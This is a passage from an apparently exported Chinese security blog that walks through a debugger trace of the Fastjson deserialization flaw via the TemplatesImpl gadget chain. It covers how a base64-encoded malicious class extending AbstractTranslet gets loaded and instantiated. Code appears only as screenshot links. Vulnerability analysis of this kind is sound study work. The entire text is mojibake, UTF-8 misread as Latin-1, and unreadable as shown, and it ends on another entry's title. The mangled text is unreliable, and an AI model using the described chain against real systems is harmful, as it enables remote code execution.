<p>è°ƒç”¨getTransletInstanceæ–¹æ³•ï¼Œè·Ÿè¿›ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/18825b7b412709fa4a714e7676637a18.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œå¯¹_nameçš„å€¼è¿›è¡Œäº†åˆ¤æ–­ï¼Œä¸èƒ½ä¸ºç©ºï¼Œä¸ºç©ºç›´æ¥returnäº†ï¼Œè€Œ_nameçš„é»˜è®¤å€¼ä¸ºç©ºï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/dee7b98cf6f97d60ac4fd613d2dddfcd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰€ä»¥æˆ‘ä»¬æ„é€ pocçš„æ—¶å€™éœ€è¦ä¸º_nameèµ‹å€¼ã€‚<br>ç„¶åè¦ä¿è¯_classä¸ºnullï¼Œåˆšå¥½å…¶é»˜è®¤å€¼å°±ä½nullï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ç”¨ç®¡ä»–ï¼Œç„¶åå°±æ‰§è¡Œäº†defineTransletClassesæ–¹æ³•ï¼Œè¿™é‡Œå‡ºç°äº†defineClassç±»ä¼¼çš„å…³é”®å­—ï¼Œæˆ‘ç¬¬ä¸€ååº”å°±æ˜¯Javaç±»åŠ è½½æ—¶çš„defineClassæ–¹æ³•ï¼Œå°†å­—èŠ‚ç è£…æ¢ä¸ºä¸€ä¸ªClasså®ä¾‹ã€‚æƒ³æ¥è¿™å„å‡½æ•°å’ŒdefineClasså‡½æ•°åŠŸèƒ½ä¸€æ ·ï¼Œæˆ‘ä»¬ç»§ç»­å¾€ä¸‹çœ‹ï¼Œåˆ°äº†è¿™ä¸€æ­¥ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e7d839663b4709b41f3c71a44141481c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è°ƒç”¨äº†getConstructoræ–¹æ³•ç„¶åç»§ç»­è°ƒç”¨äº†newInstanceæ–¹æ³•ï¼Œè¿™æ˜¯ä»€ä¹ˆï¼Ÿè¿™æ˜¯é€šè¿‡åå°„è°ƒç”¨æ„é€ æ–¹æ³•å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡å•Šï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å°†æˆ‘ä»¬çš„æ¶æ„ä»£ç å¸è½½æ¶æ„ç±»çš„æ„é€ æ–¹æ³•é‡Œé¢å°±å¥½äº†ã€‚è¿™æ—¶å€™å°±å›åˆ°äº†_class[_transletIndex]çš„å€¼å¾—ä¸ºä¸€ä¸ªClasså®ä¾‹å¯¹è±¡ã€‚ä¸”è¯¥å®ä¾‹åŒ–å¯¹è±¡ä»£è¡¨çš„ç±»ç»§æ‰¿äº†AbstractTransletç±»ï¼Œå› ä¸ºè¿™å„¿æœ‰ä¸ªå¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚é‚£ä¹ˆè¿™ä¸ª_class[_transletIndex]ä»å“ªæ¥<br>å‘¢ã€‚æˆ‘ä»¬è·Ÿè¿›defineTransletClassesæ–¹æ³•ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4eeedc02d3106571d951b121eef661da.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é¦–å…ˆåˆ¤æ–­äº†_bytecodesæ˜¯å¦ä¸ºç©ºï¼Œè¿™å½“ç„¶æ˜¯ä¸èƒ½ä¸ºç©ºçš„äº†ï¼Œå› ä¸ºæˆ‘ä»¬ä¼šæ§åˆ¶ä»–çš„å€¼ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æµç¨‹å¾€ä¸‹èµ°åŠ è½½äº†ä¸€ä¸ªloaderï¼Œæ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨ï¼Œé‡Œé¢åº”è¯¥é‡å†™äº†findclassæ–¹æ³•å®ç°äº†è‡ªå·±çš„ç±»åŠ è½½æ–¹æ³•ï¼Œæ¥ç€å¾€ä¸‹è®¡ç®—äº†_bytecodesçš„é•¿åº¦ä¸ºclassCountï¼Œä¸å‡ºæ„å¤–è¿™é‡Œç­‰äº1ã€‚ç„¶ånewäº†ä¸€ä¸ªClassæ•°ç»„èµ‹å€¼ç»™_classã€‚ç„¶ååˆ¤æ–­classCountçš„å€¼æ˜¯å¦å¤§äº1ï¼Œå½“ç„¶æ˜¯ä¸å¤§äºäº†ï¼Œç„¶åè¿›å…¥forå¾ªç¯ï¼ŒæŠŠç¬¬ä¸€ä¸ªå­—èŠ‚æ•°æ®å–å‡ºæ¥è°ƒç”¨defineClassæ–¹æ³•ç”Ÿæˆä¸€ä¸ªClasså®ä¾‹å¯¹è±¡ã€‚ç„¶åè·å–è¯¥Classå¯¹è±¡çš„çˆ¶ç±»ï¼Œåˆ¤æ–­å…¶æ˜¯å¦ç­‰äºABSTRACT_TRANSLETï¼Œè¿™ä¸ªå¸¸é‡çš„å€¼æˆ‘ä»¬è·Ÿä¸€ä¸‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/37cde3d936f2a5017a4c3d0c9a1b4f26.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ­£å¥½æ˜¯AbstractTransletç±»ï¼Œå’Œæˆ‘ä»¬ä¸Šé¢åˆ†æçš„ä¸€è‡´ï¼Œæˆ‘ä»¬éœ€è¦è®©æˆ‘ä»¬çš„æ¶æ„ç±»é›†æˆAbstractTransletç±»ã€‚ç„¶åä¸º_transleetIndexå¤èµ‹å€¼ä¸º0ã€‚defineTransletè°ƒç”¨å®Œæ¯•åå°±æ˜¯å®ä¾‹åŒ–å¯¹è±¡æ‰§è¡Œæ„é€ æ–¹æ³•äº†ã€‚</p>
<p>ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªç–‘é—®ï¼Œæˆ‘ä»¬ä¼ ç»™_bytecodesçš„ä»£ç æ˜¯base64ç¼–ç çš„ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œè‚¯å®šæœ‰å“ªä¸€æ­¥å®ç°äº†è§£ç çš„æ“ä½œï¼Œè¿™ä¸ªæˆ‘ä»¬è¦ä»å¤´å¼€å§‹çœ‹ã€‚<br>æˆ‘ä»¬çš„pocä¸­ä½¿ç”¨çš„ååºåˆ—åŒ–å‡½æ•°æ˜¯è¿™ä¸ªï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2506c24576472c96e0251e20ebe6eb1e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å…¶ä¸­jsonStringå°±æ˜¯æˆ‘ä»¬ç©¿è¿›å»çš„payloadï¼Œæˆ‘ä»¬è·Ÿä¸€ä¸‹è¿™ä¸ªparseObjectæ–¹æ³•ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f063a10dc4a3a989c771b7202d472fe8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è°ƒç”¨äº†é‡è½½æ–¹æ³•ï¼Œç»§ç»­è·Ÿï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/21be525054f6eacbb38b83131c73b952.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è·Ÿåˆ°äº†è¿™é‡Œæ³¨æ„æœ‰ä¸¤ä¸ªå…³é”®çš„åœ°æ–¹ï¼Œä¸€ä¸ªæ˜¯ç¬¬ä¸€ä¸ªç®­å¤´å¤„ç”Ÿæˆäº†ä¸€ä¸ªJSONè§£æå™¨å¯¹è±¡ï¼Œä¸€ä¸ªæ˜¯ç¬¬äºŒä¸ªç®­å¤´å¤„è°ƒç”¨çš„parseObjectæ–¹æ³•ï¼Œæˆ‘ä»¬å…ˆè·Ÿç¬¬äºŒä¸ªç®­å¤´ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/679d84dab4f64ffc90b42c06ba0f635b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å»åçœ‹åˆ°åˆä¸€ä¸ªtokençš„åˆ¤æ–­ï¼Œè¿™ä¸ªåé¢å†å°†ï¼Œæœ€ååˆ°è°ƒç”¨getDeserializeræ–¹æ³•ï¼Œè·å–ä¸€ä¸ªååºåˆ—åŒ–å™¨ï¼Œç„¶åè°ƒç”¨å…¶deerialzeæ–¹æ³•ï¼Œè·Ÿåˆ°æ–¹æ³•é‡Œé¢ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a08f58da592247915b64ee616dfc21e6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨æ„åˆ°æœ€åreturnå¤„çš„ä¸‰å…ƒè¿ç®—ç¬¦ï¼Œåˆ¤æ–­typeæ˜¯å¦ä¸ºClasså®ä¾‹ï¼Œå¹¶ä¸”ä¸æ˜¯Object.Classå®ä¾‹ï¼Œå¹¶ä¸”ä¸æ˜¯Serializable.Classå®ä¾‹ï¼Œè¿™ä¸ªåˆ¤æ–­ä¸ºå¦ï¼Œæ‰€ä»¥æœ€åæ‰§è¡Œäº†parser.parseræ–¹æ³•ï¼Œè·Ÿè¿›å»ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e464c93696f3b3b0857384cd5d1f3be5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œæœ‰å¤§å—çš„è¯­å¥å¯¹lexer.tokençš„å€¼å°½å¿ƒåˆ¤æ–­ï¼Œé‚£ä¹ˆè¿™ä¸ªå€¼ä¸ºå¤šå°‘å‘¢ï¼Ÿæˆ‘ä»¬éœ€è¦å›åˆ°å‰é¢çš„æ­¥éª¤ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a4c70ef479481c8497a1ad8c5093c84c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·Ÿè¿›è¿™ä¸ªæ–°å»ºè§£æå™¨çš„æ“ä½œï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/97befd5b67a280e376c3346558e06c0c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è°ƒç”¨äº†æ„é€ æ–¹æ³•ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4fb8bbf9a4cbf45602511d6cfac43106.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>this.lexeråœ¨è¿™å„¿è¢«èµ‹å€¼ï¼Œå½¢å‚lexeræ˜¯ä¸€ä¸ªJSONScannerå¯¹è±¡ç”±ä¸Šä¸€æ­¥ä¼ è¿›æ¥ã€‚ç„¶åæ‰§è¡Œlexer.getcurrentæ–¹æ³•ï¼Œçœ‹çœ‹ä»–å¹²äº†ä»€ä¹ˆï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f42e03f693cc4efbfc16f5b6fb6bdd48.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åå›äº†this.chçš„å€¼ï¼Œè¿™ä¸ªå€¼å½“å‰ä¸º{ çœ‹çœ‹è¿™ä¸ªå€¼æ€ä¹ˆè·å–çš„ï¼Œè¯¥å€¼æ˜¯åœ¨åˆ›å»ºJSONScannerå¯¹è±¡æ—¶å†æ„é€ æ–¹æ³•ä¸­èµ‹å€¼çš„ï¼Œè·Ÿè¿›å»ï¼š</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/afe015a247f576402a14867fe2a58e19.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»§ç»­è·Ÿåˆ°this.nexté‡Œé¢:<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7e721ed2548ac42df0d2e96570444dfd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œçœ‹åˆ°æœ‰ä¸€ä¸ªä¸‰å…ƒè¿ç®—ç¬¦ï¼Œå¦‚æœå½“å‰çš„indexå¤§äºthis.lenåˆ™ä¸ºthis.chèµ‹å€¼ä¸º\u001aï¼Œå¦åˆ™è®¡ç®—this.textåœ¨indexå¤„çš„å­—ç¬¦èµ‹å€¼ç»™this.chã€‚this.len ä¸ this.textåœ¨ä¸Šä¸€çº§å‡½æ•°èµ‹å€¼ï¼Œåˆ†åˆ«ä¸ºinputä¸inputçš„é•¿åº¦ï¼Œè€Œinputå°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥çš„pauloadã€‚æ‰€ä»¥æœ€å¼€å§‹è·å–åˆ°çš„this.chä¸º { åé¢æ¯è°ƒç”¨ä¸€æ¬¡this.getcurrentå°±æ˜¯è°ƒç”¨ä¸€æ¬¡this.nextè·å–ä¸‹ä¸€ä¸ªå­—ç¬¦çš„å€¼ï¼Œè¿™æ—¶å€™æˆ‘ä»¬è¿”å›åˆ°getcurrentçš„è°ƒç”¨å¤„ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ecb5ba3b4262d1036a53ec92d6d5357f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ch &#x3D;&#x3D;â€˜{â€™æˆç«‹ï¼Œç„¶åè·å–ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼Œå¹¶æŠŠtokenè®¾ç½®ä¸º12ã€‚<br>ä»¥ä¸Šå°±æ˜¯tokençš„ç”±æ¥ï¼Œç„¶åæˆ‘ä»¬å›åˆ°parseå‡½æ•°ï¼Œæ‰¾åˆ°case 12ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c80db5f1bc10df5d5d7b112bb9ab0636.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·Ÿåˆ°this.parseObjecté‡Œé¢ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6b132329d9a05c2df08cc4e075cc9b67.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸€æ­¥æ­¥è°ƒè¯•æœ€ååˆ°äº†ç¬¬äºŒä¸ªçº¢ç®­å¤´å¤„ï¼Œåˆ¤æ–­ç¬¬äºŒä¸ªchæ˜¯å¦ä¸ºâ€ ,å½“ç„¶æ˜¯çš„ï¼Œæˆ‘ä»¬è®©è°ƒè¯•è¿‡ç¨‹å¼ºåˆ¶è·³è½¬åˆ°ç¬¬176è¡Œï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3d5c85e5f6fbb39267499e1d386e64da.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œè·å–äº†keyçš„å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“æ˜¯å¤šå°‘ï¼Œå†å‰è¿›ä¸€æ­¥ï¼š</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/419ec316e45994ee75282e83ef275758.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¸å°±æœ‰äº†å—ï¼Œkeyå°±æ˜¯@typeï¼Œç»§ç»­å•æ­¥å¾€ä¸‹èµ°å°±åˆ°äº†è¿™å„¿ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/23da7cbb241829c5c2aaca5ca2465275.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ¤æ–­keyæ˜¯å¦ç­‰äºJSON.DEFAULT_TYPE_KEYï¼Œçœ‹çœ‹è¿™ä¸ªå¸¸é‡æ˜¯å¤šå°‘ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1e01dda8b1c061a4fce244eaab0bb788.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¯æ˜æ˜¯ç›¸ç­‰çš„ã€‚ç¬¬äºŒä¸ªæ¡ä»¶å°±ä¸è·Ÿäº†ã€‚ç„¶åè¿›å…¥åˆ°ifåˆ¤æ–­é‡Œé¢è·å–äº†refï¼Œèµ°åˆ°ä»–çš„ä¸‹ä¸€æ­¥çœ‹çœ‹refç­‰äºå¤šå°‘ï¼Œä¸å¹¸çš„æ˜¯ï¼Œè°ƒè¯•çš„æ—¶å€™æ²¡çœ‹åˆ°ï¼Œé‚£åªèƒ½å»çœ‹çœ‹lexer.scanSymbolå¹²äº†ä»€ä¹ˆäº†ï¼Œè¿™ä¸ªå’Œè·å–keyå€¼å¾—æ–¹æ³•ä¸€æ ·ï¼Œæˆ‘çŒœå°±æ˜¯è·å–@typeçš„å€¼ï¼š<br>æ²¡è·Ÿåˆ°ï¼Œå“ˆå“ˆå°´å°¬ï¼ï¼ï¼ï¼ï¼ç›´æ¥è·³è¿‡ï¼ŒèŒƒæ¹–IDEå°±æ˜¯@typeçš„å€¼ï¼š<br>ç„¶åå°±è°ƒç”¨äº†loadClasså‡½æ•°ï¼Œè¿™ä¸ªâ€¦..ï¼Œä¸å°±æ˜¯è¦å‡†å¤‡åŠ è½½ç±»äº†å—ï¼Œæˆ‘ä»¬è¿›å»çœ‹çœ‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/13c3654464cee3c403c0a1227a229ffe.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœç„¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ç±»åŠ è½½å™¨ï¼Œæˆ‘ä»¬ä¼ è¿›æ¥çš„æ˜¯é»˜è®¤ç±»åŠ è½½å™¨ä¹Ÿå°±æ˜¯ç³»ç»Ÿç±»åŠ è½½å™¨ã€‚é¦–å…ˆåˆ¤æ–­clazzæ˜¯å¦ä¸ºç©ºï¼Œå½“ç„¶ä¸ä¸ºç©ºï¼Œç„¶ååˆ¤æ–­ç±»åç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯[ï¼Œå½“ç„¶ä¹Ÿä¸æ˜¯ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ä»¥Lå¼€å¤´ï¼Œå½“ç„¶ä¹Ÿä¸æ˜¯ï¼Œéƒ½ä¸æ˜¯ä¹‹ååˆ¤æ–­ç±»åŠ è½½å™¨æ˜¯å¦ä¸ºç©ºï¼Œå½“ç„¶ä¸æ˜¯ï¼Œç„¶åè°ƒç”¨ç³»ç»Ÿç±»åŠ è½½å™¨çš„loadClassæ–¹æ³•åŠ è½½äº†æˆ‘ä»¬çš„æ¶æ„TemplataImplç±»å¹¶è¿”å›ã€‚åˆ°è¿™é‡Œæˆ‘ä»¬å°±è·å¾—äº†TemplateImplç±»çš„Classå®ä¾‹å¯¹è±¡äº†ã€‚ç„¶åå°±æ˜¯é€šè¿‡åå°„æœºåˆ¶è·å¾—ç±»åã€å­—æ®µä¹‹ç±»çš„ä¸€ç³»åˆ—å€¼äº†ã€‚ç„¶åå•æ­¥å‘ä¸‹æ¥åˆ°è¿™é‡Œï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9f73cac0c741f9b7a555c7727aa9890f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·Ÿè¿›å»ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/54fc5f878379efa07b945d4ab82e8366.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è°ƒç”¨é‡è½½æ–¹æ³•ï¼Œç»§ç»­è·Ÿï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c6b127bec0b43f2432ab9716db80349a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿˜æ˜¯é‡è½½ï¼Œç»§ç»­ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0b6053e5d2e6ba965c51337978ba4982.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæ¥åˆ°äº†è¿™é‡Œï¼Œå•æ­¥å‘ä¸‹åˆ°è¿™é‡Œï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/dfc7531499a7428d38c9c68857ed7f7d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>åˆ°367è¡Œå·²ç»è·å–åˆ°äº†outputProperitiesçš„å€¼äº†<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b72d99e660b80bcfe797a6e6b73468cc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹çœ‹ä»–æ€ä¹ˆæ¥çš„ï¼Œæœ€åå®šä½åˆ°åº•63è¡Œï¼Œåœ¨æ„é€ æ–¹æ³•ä¸­è¢«èµ‹å€¼ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/62a76338ff33d2d8182905a2475a49ce.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£å°±çœ‹çœ‹åœ¨å“ªåˆ›å»ºçš„å§ï¼Œè¿”å›åˆ°ä¸Šä¸€å±‚ï¼Œå½“ç„¶æ˜¯åœ¨è¿™å„¿ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d1342d5949c6380b5bfdc33abfabcb23.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›åˆ°getDeserializeræ–¹æ³•é‡Œé¢ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/84d5091d7fb87ddd235d21d8ee9fa7b2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·Ÿè¿›è¿™ä¸€æ­¥ï¼Œå•æ­¥åˆ°è¿™å„¿ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3a3a70dd76788ffe1f9496e814d1c5da.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»§ç»­è·Ÿè¿›å»ï¼Œå®šä½åˆ°è¿™å„¿ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5a3b8cb3c6aadb5a6cccbff31a0be4e9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»§ç»­è·Ÿè¿›å»ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6e91952f5d4c63dcada2109957040447.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è¿™é‡Œè·å–äº†æ‰€æœ‰çš„å±æ€§ä¸æ–¹æ³•ï¼Œç»§ç»­å‘ä¸‹åˆ°è¿™å„¿ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/50f3c6e52debaacd230984e5f166a384.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ¤æ–­æ–¹æ³•åæ˜¯å¦é•¿åº¦å¤§äº4ï¼Œå› ä¸ºæœ‰getä¸setå˜›ï¼Œä¸èƒ½æ˜¯é™æ€æ–¹æ³•ï¼Œè¿”å›å€¼ä¸èƒ½ä¸ºvoidï¼Œæˆ–è€…è¿”å›å€¼ä¸ºè‡ªèº«çš„ç±»ï¼Œç»§ç»­å‘ä¸‹åˆ¤æ–­æ˜¯å¦setå¼€å¤´ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/16fef496cf1fc4b119efb2eb7b3b668a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¸ªæœ€åæœ‰ä¸€ä¸ªaddæ–¹æ³•è·å¾—äº†æ‰€æœ‰çš„å±æ€§æ”¾åˆ°fieldListé‡Œé¢<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7f7989d251cb1a7d61acc64a89fa6735.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é€šè¿‡åŒæ ·çš„æ–¹æ³•è·å¾—getæ–¹æ³•çš„å±æ€§ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7b646c4806f06aad7cfadc5270791a03.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ€ç»ˆè¿”å›ä¸€ä¸ªJavaBeanInfoå¯¹è±¡ï¼Œé‡Œé¢å°±æœ‰outputPropertiesåˆ™å€¼äº†ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ec5fcba7df48c9af84f46331892f8dc4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åç»§ç»­å‘ä¸‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/dca9c0ffd21e2e2c7835c0d0c2cb313d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·Ÿè¿›å»ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ae9ee75446203cd8576d24a42b85704e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»§ç»­è·Ÿï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a0d24d9b5d3bf931ef0b112c6bce3570.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ°è¿™å„¿åï¼Œåˆ¤æ–­_bytecodesç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä¸æ˜¯_ï¼Œå¦‚æœæ˜¯åˆ™æ›¿æ¢ä¸ºç©ºï¼Œåˆ°æœ€åè¿”å›ä¸€ä¸ªfieldDeserializerï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/822d25190bc4b113d757a827db2f4e4b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰§è¡Œå®Œååˆ°è¿™å„¿ï¼Œåæ­£æˆ‘æ˜¯æ²¡æœ‰è·³è¿‡å»ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d3215dd01bbd53746fc3e26adf1b66cd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è¿›å»ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/da541b6fc0351c2fccfda9e480cb0b7d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è¿™å„¿å®ä¾‹åŒ–äº†ä¸€ä¸ªå¯¹è±¡ï¼Œä¼šè°ƒç”¨æ„é€ æ–¹æ³•ï¼Œè·Ÿè¿›å»å°±åˆ°äº†è¿™é‡Œï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/74de1d2ca82ad454088850b963d7ff36.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åé¢çš„è¿‡ç¨‹å°±å’Œæˆ‘ä»¬å¼€å§‹çš„åˆ†æä¸€æ ·äº†ï¼Œå®Œæ•´çš„è°ƒç”¨æ ˆï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a35f9036a8fd9caeeb4c5e8b3f1d88cd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¯´é“è¿™é‡Œè¿˜æ˜¯æ²¡æœ‰è®²ä¸ºä»€ä¹ˆè¦base64ç¼–ç ï¼Œä¹Ÿæ˜¯åŸä½œè€…é”…ï¼Œç‹—å¤´ä¿å‘½ã€‚å½“tokenç­‰äº4çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨lexer.bytesValue<br><img src="https://i-blog.csdnimg.cn/blog_migrate/432d562f7dec5775315372382631e7fc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬çŸ¥é“lexerå¯¹è±¡æ˜¯é€šè¿‡JSONScannerç”Ÿæˆçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åˆ°JSONScannerç±»é‡Œé¢å»æ‰¾bytesValueï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/930a4b463d3a7cd04ca8c2fc6c8a8d58.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œè°ƒç”¨äº†base64çš„è§£ç å‡½æ•°ã€‚<br>æœ€åè·Ÿçš„æœ‰ç‚¹æ°´ï¼Œå› ä¸ºæˆ‘ä¹Ÿæœ‰ç‚¹æ²¡æœ‰è·Ÿæ˜ç™½ï¼ï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>fastjson</tag>
        <tag>gadgets</tag>
        <tag>templateImpl</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjsonååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æåŠå¤ç°</title>
    <url>/archives/38dceb78.html</url>
    <content><![CDATA[<p>@<a href="Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0">TOC</a></p>
